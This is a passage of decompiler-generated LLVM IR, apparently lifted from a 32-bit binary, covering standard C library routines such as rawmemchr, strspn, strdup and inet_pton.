  %v8_80563c4 = phi i1 [ %v8_80563c4.pre, %dec_label_pc_80563c4.lr.ph ], [ %v5_80563c5, %dec_label_pc_80563c4.dec_label_pc_80563c1_crit_edge ]
  %v4_80563c4 = phi i32 [ %v4_80563c4.pre, %dec_label_pc_80563c4.lr.ph ], [ %v0_80563c6, %dec_label_pc_80563c4.dec_label_pc_80563c1_crit_edge ]
  %v2_80563ce11 = phi i32 [ %v2_80563bd, %dec_label_pc_80563c4.lr.ph ], [ %v7_80563c5, %dec_label_pc_80563c4.dec_label_pc_80563c1_crit_edge ]
  %v0_80563c4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80563c4 = inttoptr i32 %v0_80563c4 to i8*
  %v2_80563c4 = load i8, i8* %v1_80563c4, align 1
  %v3_80563c4 = zext i8 %v2_80563c4 to i32
  %v5_80563c4 = and i32 %v4_80563c4, -256
  %v6_80563c4 = or i32 %v5_80563c4, %v3_80563c4
  store i32 %v6_80563c4, i32* %eax.global-to-local, align 4
  %v9_80563c4 = select i1 %v8_80563c4, i32 -1, i32 1
  %v10_80563c4 = add i32 %v9_80563c4, %v0_80563c4
  store i32 %v10_80563c4, i32* %esi.global-to-local, align 4
  %v3_80563c5 = inttoptr i32 %v2_80563ce11 to i8*
  store i8 %v2_80563c4, i8* %v3_80563c5, align 1
  %v4_80563c5 = load i32, i32* %edi.global-to-local, align 4
  %v5_80563c5 = load i1, i1* @df, align 1
  %v6_80563c5 = select i1 %v5_80563c5, i32 -1, i32 1
  %v7_80563c5 = add i32 %v6_80563c5, %v4_80563c5
  store i32 %v7_80563c5, i32* %edi.global-to-local, align 4
  %v0_80563c6 = load i32, i32* %eax.global-to-local, align 4
  %v3_80563c6 = trunc i32 %v0_80563c6 to i8
  %v4_80563c6 = icmp eq i8 %v3_80563c6, 0
  %v1_80563c8 = icmp eq i1 %v4_80563c6, false
  br i1 %v1_80563c8, label %dec_label_pc_80563c4.dec_label_pc_80563c1_crit_edge, label %dec_label_pc_80563cf

dec_label_pc_80563c4.dec_label_pc_80563c1_crit_edge: ; preds = %dec_label_pc_80563c4
  %v0_80563c1.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_80563c1 = add i32 %v0_80563c1.pre, -1
  %v8_80563c1 = icmp eq i32 %v1_80563c1, 0
  store i32 %v1_80563c1, i32* %ecx.global-to-local, align 4
  br i1 %v8_80563c1, label %dec_label_pc_80563cc, label %dec_label_pc_80563c4

dec_label_pc_80563cc:                             ; preds = %dec_label_pc_80563c4.dec_label_pc_80563c1_crit_edge, %entry
  %v2_80563ce.lcssa = phi i32 [ %v2_80563bd, %entry ], [ %v7_80563c5, %dec_label_pc_80563c4.dec_label_pc_80563c1_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_80563ce = inttoptr i32 %v2_80563ce.lcssa to i8*
  store i8 0, i8* %v3_80563ce, align 1
  %v4_80563ce = load i32, i32* %edi.global-to-local, align 4
  %v5_80563ce = load i1, i1* @df, align 1
  %v6_80563ce = select i1 %v5_80563ce, i32 -1, i32 1
  %v7_80563ce = add i32 %v6_80563ce, %v4_80563ce
  store i32 %v7_80563ce, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80563cf

dec_label_pc_80563cf:                             ; preds = %dec_label_pc_80563c4, %dec_label_pc_80563cc
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_80563d3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80563d3, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_80563c1, { 1, 0 }
  uselistorder i32 %v0_80563c6, { 1, 0 }
  uselistorder i32 %v7_80563c5, { 0, 2, 1 }
  uselistorder i1 %v5_80563c5, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80563cf, { 1, 0 }
  uselistorder label %dec_label_pc_80563c4, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80563d9 = load i32, i32* @ebx, align 4
  %v4_80563da = urem i32 %arg2, 256
  %v4_80563de = ptrtoint i8* %arg1 to i32
  %v2_80563e93 = urem i32 %v4_80563de, 4
  %v3_80563e94 = icmp eq i32 %v2_80563e93, 0
  %v1_80563eb8 = icmp eq i1 %v3_80563e94, false
  %v4_80563e4 = trunc i32 %arg2 to i8
  br i1 %v1_80563eb8, label %dec_label_pc_80563e4, label %dec_label_pc_80563ed

dec_label_pc_80563e4:                             ; preds = %entry, %dec_label_pc_80563e8
  %v0_80563e8 = phi i32 [ %v1_80563e8, %dec_label_pc_80563e8 ], [ %v4_80563de, %entry ]
  %v1_80563e4 = inttoptr i32 %v0_80563e8 to i8*
  %v2_80563e4 = load i8, i8* %v1_80563e4, align 1
  %v15_80563e4 = icmp eq i8 %v2_80563e4, %v4_80563e4
  br i1 %v15_80563e4, label %dec_label_pc_8056438, label %dec_label_pc_80563e8

dec_label_pc_80563e8:                             ; preds = %dec_label_pc_80563e4
  %v1_80563e8 = add i32 %v0_80563e8, 1
  %v2_80563e9 = urem i32 %v1_80563e8, 4
  %v3_80563e9 = icmp eq i32 %v2_80563e9, 0
  %v1_80563eb = icmp eq i1 %v3_80563e9, false
  br i1 %v1_80563eb, label %dec_label_pc_80563e4, label %dec_label_pc_80563ed

dec_label_pc_80563ed:                             ; preds = %entry, %dec_label_pc_80563e8
  %v0_80563f0 = phi i32 [ %v1_80563e8, %dec_label_pc_80563e8 ], [ %v4_80563de, %entry ]
  %v2_80563f4 = mul nuw nsw i32 %v4_80563da, 256
  %v2_80563f7 = or i32 %v2_80563f4, %v4_80563da
  %v2_80563fb = mul i32 %v2_80563f7, 65536
  %v2_80563fe = or i32 %v2_80563fb, %v2_80563f7
  br label %dec_label_pc_8056400

dec_label_pc_8056400:                             ; preds = %dec_label_pc_8056430, %dec_label_pc_8056400, %dec_label_pc_80563ed
  %v0_8056404 = phi i32 [ %v0_80563f0, %dec_label_pc_80563ed ], [ %v1_8056404, %dec_label_pc_8056400 ], [ %v1_8056404, %dec_label_pc_8056430 ]
  %v2_8056402 = inttoptr i32 %v0_8056404 to i32*
  %v3_8056402 = load i32, i32* %v2_8056402, align 4
  %v4_8056402 = xor i32 %v3_8056402, %v2_80563fe
  %v1_8056404 = add i32 %v0_8056404, 4
  store i32 %v1_8056404, i32* @ecx, align 4
  %v1_8056407 = add i32 %v4_8056402, 2130640639
  %v1_805640d = sub i32 -1, %v4_8056402
  store i32 %v1_805640d, i32* @edx, align 4
  %v2_805640f = xor i32 %v1_8056407, %v1_805640d
  %v1_8056411 = and i32 %v2_805640f, -2130640640
  %v2_8056411 = icmp eq i32 %v1_8056411, 0
  br i1 %v2_8056411, label %dec_label_pc_8056400, label %dec_label_pc_8056418

dec_label_pc_8056418:                             ; preds = %dec_label_pc_8056400
  %v2_805641b = inttoptr i32 %v0_8056404 to i8*
  %v3_805641b = load i8, i8* %v2_805641b, align 1
  %v16_805641b = icmp eq i8 %v3_805641b, %v4_80563e4
  br i1 %v16_805641b, label %dec_label_pc_8056438, label %dec_label_pc_8056420

dec_label_pc_8056420:                             ; preds = %dec_label_pc_8056418
  %v1_8056420 = add i32 %v0_8056404, 1
  %v2_8056423 = inttoptr i32 %v1_8056420 to i8*
  %v3_8056423 = load i8, i8* %v2_8056423, align 1
  %v16_8056423 = icmp eq i8 %v3_8056423, %v4_80563e4
  br i1 %v16_8056423, label %dec_label_pc_8056438, label %dec_label_pc_8056428

dec_label_pc_8056428:                             ; preds = %dec_label_pc_8056420
  %v1_8056428 = add i32 %v0_8056404, 2
  %v2_805642b = inttoptr i32 %v1_8056428 to i8*
  %v3_805642b = load i8, i8* %v2_805642b, align 1
  %v16_805642b = icmp eq i8 %v3_805642b, %v4_80563e4
  br i1 %v16_805642b, label %dec_label_pc_8056438, label %dec_label_pc_8056430

dec_label_pc_8056430:                             ; preds = %dec_label_pc_8056428
  %v1_8056430 = add i32 %v0_8056404, 3
  %v2_8056433 = inttoptr i32 %v1_8056430 to i8*
  %v3_8056433 = load i8, i8* %v2_8056433, align 1
  %v16_8056433 = icmp eq i8 %v3_8056433, %v4_80563e4
  %v1_8056436 = icmp eq i1 %v16_8056433, false
  br i1 %v1_8056436, label %dec_label_pc_8056400, label %dec_label_pc_8056438

dec_label_pc_8056438:                             ; preds = %dec_label_pc_80563e4, %dec_label_pc_8056430, %dec_label_pc_8056428, %dec_label_pc_8056420, %dec_label_pc_8056418
  %v0_805643a = phi i32 [ %v1_8056430, %dec_label_pc_8056430 ], [ %v1_8056428, %dec_label_pc_8056428 ], [ %v1_8056420, %dec_label_pc_8056420 ], [ %v0_8056404, %dec_label_pc_8056418 ], [ %v0_80563e8, %dec_label_pc_80563e4 ]
  store i32 %v0_80563d9, i32* @ebx, align 4
  ret i32 %v0_805643a

; uselistorder directives
  uselistorder i32 %v1_805640d, { 1, 0 }
  uselistorder i32 %v1_8056404, { 2, 1, 0 }
  uselistorder i32 %v2_80563f7, { 1, 0 }
  uselistorder i32 %v1_80563e8, { 1, 0, 2 }
  uselistorder i32 %v4_80563de, { 2, 1, 0 }
  uselistorder i32 %v4_80563da, { 1, 0 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 2130640639, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8056438, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_80563ed, { 1, 0 }
  uselistorder label %dec_label_pc_80563e4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_805645e30 = load i8, i8* %arg1, align 1
  %v4_805646034 = icmp eq i8 %v2_805645e30, 0
  br i1 %v4_805646034, label %dec_label_pc_8056468, label %dec_label_pc_8056464.lr.ph

dec_label_pc_8056464.lr.ph:                       ; preds = %entry
  %v3_805645e31 = zext i8 %v2_805645e30 to i32
  %v4_805645e.pre = load i32, i32* @eax, align 4
  %v5_805645e32 = and i32 %v4_805645e.pre, -256
  %v6_805645e33 = or i32 %v3_805645e31, %v5_805645e32
  %v4_8056445 = ptrtoint i8* %arg1 to i32
  %v1_805645018 = inttoptr i32 %arg2 to i8*
  %v4_8056450.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056464

dec_label_pc_805644b:                             ; preds = %dec_label_pc_8056464, %dec_label_pc_805644f
  %v6_805645027 = phi i32 [ %v6_8056450, %dec_label_pc_805644f ], [ %v6_805645022, %dec_label_pc_8056464 ]
  %v2_805645026 = phi i8 [ %v2_8056450, %dec_label_pc_805644f ], [ %v2_805645019, %dec_label_pc_8056464 ]
  %v0_805644f25 = phi i32 [ %v1_805644f, %dec_label_pc_805644f ], [ %arg2, %dec_label_pc_8056464 ]
  %v15_805644b = icmp eq i8 %v2_805645e37, %v2_805645026
  br i1 %v15_805644b, label %dec_label_pc_8056458, label %dec_label_pc_805644f

dec_label_pc_805644f:                             ; preds = %dec_label_pc_805644b
  %v1_805644f = add i32 %v0_805644f25, 1
  store i32 %v1_805644f, i32* @edx, align 4
  %v1_8056450 = inttoptr i32 %v1_805644f to i8*
  %v2_8056450 = load i8, i8* %v1_8056450, align 1
  %v3_8056450 = zext i8 %v2_8056450 to i32
  %v5_8056450 = and i32 %v6_805645027, -256
  %v6_8056450 = or i32 %v3_8056450, %v5_8056450
  store i32 %v6_8056450, i32* @ecx, align 4
  %v4_8056452 = icmp eq i8 %v2_8056450, 0
  %v1_8056454 = icmp eq i1 %v4_8056452, false
  br i1 %v1_8056454, label %dec_label_pc_805644b, label %dec_label_pc_8056468

dec_label_pc_8056458:                             ; preds = %dec_label_pc_805644b
  %v1_805645c = add i32 %v0_805646835, 1
  %v1_805645d = add i32 %v0_805645d36, 1
  %v1_805645e = inttoptr i32 %v1_805645d to i8*
  %v2_805645e = load i8, i8* %v1_805645e, align 1
  %v3_805645e = zext i8 %v2_805645e to i32
  %v5_805645e = and i32 %v6_805645e38, -256
  %v6_805645e = or i32 %v3_805645e, %v5_805645e
  %v4_8056460 = icmp eq i8 %v2_805645e, 0
  br i1 %v4_8056460, label %dec_label_pc_8056468, label %dec_label_pc_8056464

dec_label_pc_8056464:                             ; preds = %dec_label_pc_8056464.lr.ph, %dec_label_pc_8056458
  %v4_8056450.pre = phi i32 [ %v4_8056450.pre.pre, %dec_label_pc_8056464.lr.ph ], [ %v6_805645027, %dec_label_pc_8056458 ]
  %v6_805645e38 = phi i32 [ %v6_805645e33, %dec_label_pc_8056464.lr.ph ], [ %v6_805645e, %dec_label_pc_8056458 ]
  %v2_805645e37 = phi i8 [ %v2_805645e30, %dec_label_pc_8056464.lr.ph ], [ %v2_805645e, %dec_label_pc_8056458 ]
  %v0_805645d36 = phi i32 [ %v4_8056445, %dec_label_pc_8056464.lr.ph ], [ %v1_805645d, %dec_label_pc_8056458 ]
  %v0_805646835 = phi i32 [ 0, %dec_label_pc_8056464.lr.ph ], [ %v1_805645c, %dec_label_pc_8056458 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805645019 = load i8, i8* %v1_805645018, align 1
  %v3_805645020 = zext i8 %v2_805645019 to i32
  %v5_805645021 = and i32 %v4_8056450.pre, -256
  %v6_805645022 = or i32 %v3_805645020, %v5_805645021
  store i32 %v6_805645022, i32* @ecx, align 4
  %v4_805645223 = icmp eq i8 %v2_805645019, 0
  %v1_805645424 = icmp eq i1 %v4_805645223, false
  br i1 %v1_805645424, label %dec_label_pc_805644b, label %dec_label_pc_8056468

dec_label_pc_8056468:                             ; preds = %entry, %dec_label_pc_8056458, %dec_label_pc_8056464, %dec_label_pc_805644f
  %v0_805646817 = phi i32 [ %v0_805646835, %dec_label_pc_805644f ], [ %v0_805646835, %dec_label_pc_8056464 ], [ 0, %entry ], [ %v1_805645c, %dec_label_pc_8056458 ]
  ret i32 %v0_805646817

; uselistorder directives
  uselistorder i32 %v6_805645022, { 1, 0 }
  uselistorder i8 %v2_805645019, { 1, 2, 0 }
  uselistorder i32 %v1_805645d, { 1, 0 }
  uselistorder i32 %v6_8056450, { 1, 0 }
  uselistorder i8 %v2_8056450, { 1, 2, 0 }
  uselistorder i32 %v1_805644f, { 2, 1, 0 }
  uselistorder i8 %v2_805645e30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056468, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8056464, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056470 = load i32, i32* @edi, align 4
  %v0_8056471 = load i32, i32* @esi, align 4
  %v0_8056472 = load i32, i32* @ebx, align 4
  store i32 %v0_8056472, i32* %stack_var_-12, align 4
  %v4_8056473 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056473, i32* @edi, align 4
  %v3_805647b = call i32 @strlen(i8* %arg1)
  %v1_8056480 = add i32 %v3_805647b, 1
  store i32 %v1_8056480, i32* @esi, align 4
  %v2_8056486 = call i32 @malloc(i32 %v1_8056480)
  store i32 %v2_8056486, i32* %ebx.global-to-local, align 4
  %v1_8056490 = icmp eq i32 %v2_8056486, 0
  br i1 %v1_8056490, label %dec_label_pc_80564a0, label %dec_label_pc_8056494

dec_label_pc_8056494:                             ; preds = %entry
  %v0_8056495 = load i32, i32* @esi, align 4
  %v0_8056496 = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8056486 to i16*
  %v6_8056498 = call i32 @memcpy(i16* %tmp11, i32 %v0_8056496, i32 %v0_8056495)
  %v0_80564a0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80564a0

dec_label_pc_80564a0:                             ; preds = %entry, %dec_label_pc_8056494
  %v0_80564a0 = phi i32 [ 0, %entry ], [ %v0_80564a0.pre, %dec_label_pc_8056494 ]
  %v2_80564a2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80564a2, i32* @ebx, align 4
  store i32 %v0_8056471, i32* @esi, align 4
  store i32 %v0_8056470, i32* @edi, align 4
  ret i32 %v0_80564a0

; uselistorder directives
  uselistorder i32 %v2_8056486, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 11, 8, 7, 17, 16, 15, 1, 10, 9, 5, 4, 14, 13, 12, 6, 3, 2, 0 }
  uselistorder label %dec_label_pc_80564a0, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_80564aa = load i32, i32* @esi, align 4
  %v0_80564b1 = load i32, i32* @eax, align 4
  store i32 %v0_80564b1, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80564b7 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80564b7, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80564ff15 = inttoptr i32 %v0_80564b1 to i8*
  %v2_80564ff16 = load i8, i8* %v1_80564ff15, align 1
  %v3_80564ff17 = sext i8 %v2_80564ff16 to i32
  store i32 %v3_80564ff17, i32* @ecx, align 4
  %v1_805650218 = add i32 %v0_80564b1, 1
  store i32 %v1_805650218, i32* %ebx.global-to-local, align 4
  %v1_805650319 = icmp eq i8 %v2_80564ff16, 0
  %v1_805650520 = icmp eq i1 %v1_805650319, false
  br i1 %v1_805650520, label %dec_label_pc_80564c2, label %dec_label_pc_8056507.thread

dec_label_pc_8056507.thread:                      ; preds = %entry
  br label %dec_label_pc_8056524

dec_label_pc_80564c2:                             ; preds = %entry, %dec_label_pc_80564ff.backedge
  %v3_80564ff22 = phi i32 [ %v3_80564ff, %dec_label_pc_80564ff.backedge ], [ %v3_80564ff17, %entry ]
  %v2_80564ff21 = phi i8 [ %v2_80564ff, %dec_label_pc_80564ff.backedge ], [ %v2_80564ff16, %entry ]
  %v1_80564c2 = add nsw i32 %v3_80564ff22, -48
  store i32 %v1_80564c2, i32* %eax.global-to-local, align 4
  %v6_80564c8 = icmp ugt i32 %v1_80564c2, 9
  br i1 %v6_80564c8, label %dec_label_pc_80564eb, label %dec_label_pc_80564ca

dec_label_pc_80564ca:                             ; preds = %dec_label_pc_80564c2
  %v0_80564ca = load i32, i32* @esi, align 4
  %v1_80564ca = inttoptr i32 %v0_80564ca to i8*
  %v2_80564ca = load i8, i8* %v1_80564ca, align 1
  %v2_80564cd = zext i8 %v2_80564ca to i32
  %v3_80564cd = mul nuw nsw i32 %v2_80564cd, 10
  %v3_80564d0 = add nsw i32 %v3_80564cd, %v1_80564c2
  store i32 %v3_80564d0, i32* %eax.global-to-local, align 4
  %v6_80564d9 = icmp ugt i32 %v3_80564d0, 255
  br i1 %v6_80564d9, label %dec_label_pc_8056524, label %dec_label_pc_80564db

dec_label_pc_80564db:                             ; preds = %dec_label_pc_80564ca
  %v1_80564db = trunc i32 %v3_80564d0 to i8
  store i8 %v1_80564db, i8* %v1_80564ca, align 1
  %v0_80564dd = load i32, i32* @edx, align 4
  %v1_80564dd = icmp eq i32 %v0_80564dd, 0
  %v1_80564df = icmp eq i1 %v1_80564dd, false
  br i1 %v1_80564df, label %dec_label_pc_80564ff.backedge, label %dec_label_pc_80564e1

dec_label_pc_80564e1:                             ; preds = %dec_label_pc_80564db
  %v0_80564e1 = load i32, i32* @edi, align 4
  %v1_80564e1 = add i32 %v0_80564e1, 1
  store i32 %v1_80564e1, i32* @edi, align 4
  %v1_80564e2 = add i32 %v0_80564e1, -3
  %v6_80564e2 = sub i32 2, %v0_80564e1
  %v7_80564e2 = and i32 %v6_80564e2, %v1_80564e1
  %v8_80564e2 = icmp slt i32 %v7_80564e2, 0
  %v9_80564e2 = icmp eq i32 %v1_80564e2, 0
  %v10_80564e2 = icmp slt i32 %v1_80564e2, 0
  %v3_80564e5 = icmp eq i1 %v10_80564e2, %v8_80564e2
  %v4_80564e5 = icmp eq i1 %v9_80564e2, false
  %v5_80564e5 = and i1 %v4_80564e5, %v3_80564e5
  br i1 %v5_80564e5, label %dec_label_pc_8056524, label %dec_label_pc_80564e7

dec_label_pc_80564e7:                             ; preds = %dec_label_pc_80564e1
  %v1_80564e7 = and i32 %v0_80564dd, -256
  %v2_80564e7 = or i32 %v1_80564e7, 1
  store i32 %v2_80564e7, i32* @edx, align 4
  br label %dec_label_pc_80564ff.backedge

dec_label_pc_80564eb:                             ; preds = %dec_label_pc_80564c2
  %v9_80564eb = icmp eq i8 %v2_80564ff21, 46
  %v1_80564ee = icmp eq i1 %v9_80564eb, false
  br i1 %v1_80564ee, label %dec_label_pc_8056524, label %dec_label_pc_80564f0

dec_label_pc_80564f0:                             ; preds = %dec_label_pc_80564eb
  %v0_80564f0 = load i32, i32* @edx, align 4
  %v1_80564f0 = icmp eq i32 %v0_80564f0, 0
  br i1 %v1_80564f0, label %dec_label_pc_8056524, label %dec_label_pc_80564f4

dec_label_pc_80564f4:                             ; preds = %dec_label_pc_80564f0
  %v0_80564f4 = load i32, i32* @edi, align 4
  %v9_80564f4 = icmp eq i32 %v0_80564f4, 4
  br i1 %v9_80564f4, label %dec_label_pc_8056524, label %dec_label_pc_80564f9

dec_label_pc_80564f9:                             ; preds = %dec_label_pc_80564f4
  %v0_80564f9 = load i32, i32* @esi, align 4
  %v1_80564f9 = add i32 %v0_80564f9, 1
  store i32 %v1_80564f9, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_80564fc = inttoptr i32 %v1_80564f9 to i8*
  store i8 0, i8* %v1_80564fc, align 1
  br label %dec_label_pc_80564ff.backedge

dec_label_pc_80564ff.backedge:                    ; preds = %dec_label_pc_80564f9, %dec_label_pc_80564e7, %dec_label_pc_80564db
  %v0_80564ff.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80564ff = inttoptr i32 %v0_80564ff.pre to i8*
  %v2_80564ff = load i8, i8* %v1_80564ff, align 1
  %v3_80564ff = sext i8 %v2_80564ff to i32
  store i32 %v3_80564ff, i32* @ecx, align 4
  %v1_8056502 = add i32 %v0_80564ff.pre, 1
  store i32 %v1_8056502, i32* %ebx.global-to-local, align 4
  %v1_8056503 = icmp eq i8 %v2_80564ff, 0
  %v1_8056505 = icmp eq i1 %v1_8056503, false
  br i1 %v1_8056505, label %dec_label_pc_80564c2, label %dec_label_pc_8056507

dec_label_pc_8056507:                             ; preds = %dec_label_pc_80564ff.backedge
  %v0_8056507.pre = load i32, i32* @edi, align 4
  %v7_805650a = icmp sgt i32 %v0_8056507.pre, 3
  br i1 %v7_805650a, label %dec_label_pc_805650c, label %dec_label_pc_8056524

dec_label_pc_805650c:                             ; preds = %dec_label_pc_8056507
  %v0_805650c = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_80564b7, i32* %eax.global-to-local, align 4
  %v3_8056515 = bitcast i32* %stack_var_-20 to i16*
  %v4_8056515 = call i32 @memcpy(i16* %v3_8056515, i32 4, i32 %v0_805650c)
  br label %dec_label_pc_8056526

dec_label_pc_8056524:                             ; preds = %dec_label_pc_80564f4, %dec_label_pc_80564f0, %dec_label_pc_80564eb, %dec_label_pc_80564e1, %dec_label_pc_80564ca, %dec_label_pc_8056507.thread, %dec_label_pc_8056507
  br label %dec_label_pc_8056526

dec_label_pc_8056526:                             ; preds = %dec_label_pc_805650c, %dec_label_pc_8056524
  %storemerge = phi i32 [ 0, %dec_label_pc_8056524 ], [ 1, %dec_label_pc_805650c ]
  %v0_805652d = phi i32 [ 0, %dec_label_pc_8056524 ], [ 1, %dec_label_pc_805650c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80564aa, i32* @esi, align 4
  ret i32 %v0_805652d

; uselistorder directives
  uselistorder i32 %v3_80564ff, { 1, 0 }
  uselistorder i8 %v2_80564ff, { 1, 2, 0 }
  uselistorder i32 %v1_80564e2, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8056526, { 1, 0 }
  uselistorder label %dec_label_pc_8056524, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80564c2, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805652e = load i32, i32* @ebp, align 4
  %v0_805652f = load i32, i32* @edi, align 4
  %v0_8056530 = load i32, i32* @esi, align 4
  %v0_8056531 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8056539 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8056539, i32* @edi, align 4
  %v9_805653d = icmp eq i32 %arg1, 2
  br i1 %v9_805653d, label %dec_label_pc_805654d, label %dec_label_pc_8056542

dec_label_pc_8056542:                             ; preds = %entry
  %v9_8056542 = icmp eq i32 %arg1, 10
  %v1_8056545 = icmp eq i1 %v9_8056542, false
  br i1 %v1_8056545, label %dec_label_pc_80566de, label %dec_label_pc_805655d

dec_label_pc_805654d:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8056539, i32* @eax, align 4
  %v3_8056553 = call i32 @inet_pton4(i32 %v0_8056531, i32 %v0_8056530, i32 %v0_805652f)
  store i32 %v3_8056553, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566f0

dec_label_pc_805655d:                             ; preds = %dec_label_pc_8056542
  %v2_8056562 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056562, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8056567 = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8056567, i32* @ebx, align 4
  %v2_805656e = add i32 %v5_8056567, 16
  store i32 %v2_805656e, i32* %eax.global-to-local, align 4
  %v0_8056578 = load i32, i32* @edi, align 4
  %v1_8056578 = inttoptr i32 %v0_8056578 to i8*
  %v2_8056578 = load i8, i8* %v1_8056578, align 1
  %v11_8056578 = icmp eq i8 %v2_8056578, 58
  %v1_805657b = icmp eq i1 %v11_8056578, false
  br i1 %v1_805657b, label %dec_label_pc_805660e, label %dec_label_pc_805657d

dec_label_pc_805657d:                             ; preds = %dec_label_pc_805655d
  %v1_805657d = add i32 %v0_8056578, 1
  store i32 %v1_805657d, i32* @edi, align 4
  %v1_805657e = inttoptr i32 %v1_805657d to i8*
  %v2_805657e = load i8, i8* %v1_805657e, align 1
  %v11_805657e = icmp eq i8 %v2_805657e, 58
  %v1_8056581 = icmp eq i1 %v11_805657e, false
  br i1 %v1_8056581, label %dec_label_pc_80566ee, label %dec_label_pc_805660e

dec_label_pc_8056595:                             ; preds = %dec_label_pc_805664e
  %v4_805659d = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805a5f4.564, i32 0, i32 0), i32 %v2_8056655)
  store i32 %v4_805659d, i32* %eax.global-to-local, align 4
  %v0_80565a2 = load i32, i32* @edi, align 4
  %v1_80565a2 = add i32 %v0_80565a2, 1
  store i32 %v1_80565a2, i32* @edi, align 4
  %v1_80565a6 = icmp eq i32 %v4_805659d, 0
  br i1 %v1_80565a6, label %dec_label_pc_80565c5, label %dec_label_pc_80565aa

dec_label_pc_80565aa:                             ; preds = %dec_label_pc_8056595
  %v0_80565aa = load i32, i32* @ebp, align 4
  %v2_80565aa = mul i32 %v0_80565aa, 16
  %v1_80565ad = add i32 %v4_805659d, -134587892
  store i32 %v1_80565ad, i32* %eax.global-to-local, align 4
  %v2_80565b2 = or i32 %v2_80565aa, %v1_80565ad
  store i32 %v2_80565b2, i32* @ebp, align 4
  %tmp126 = icmp ult i32 %v2_80565b2, 65536
  br i1 %tmp126, label %dec_label_pc_805664e.outer, label %dec_label_pc_80566ee

dec_label_pc_805664e.outer:                       ; preds = %dec_label_pc_80565aa, %dec_label_pc_805660e
  %v0_805665136 = phi i32 [ %v1_80565a2, %dec_label_pc_80565aa ], [ %stack_var_-36.0.in, %dec_label_pc_805660e ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_80565aa ], [ %stack_var_-44.0, %dec_label_pc_805660e ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_80565aa ], [ %stack_var_-36.0, %dec_label_pc_805660e ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_80565aa ], [ 0, %dec_label_pc_805660e ]
  %v4_80565ca = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_80565cf = icmp eq i1 %v4_80565ca, false
  br label %dec_label_pc_805664e

dec_label_pc_80565c5:                             ; preds = %dec_label_pc_8056595
  %v0_80565c5 = load i32, i32* @esi, align 4
  %v9_80565c5 = icmp eq i32 %v0_80565c5, 58
  %v1_80565c8 = icmp eq i1 %v9_80565c5, false
  br i1 %v1_80565c8, label %dec_label_pc_805661a, label %dec_label_pc_80565ca

dec_label_pc_80565ca:                             ; preds = %dec_label_pc_80565c5
  br i1 %v1_80565cf, label %dec_label_pc_80565e6, label %dec_label_pc_80565d1

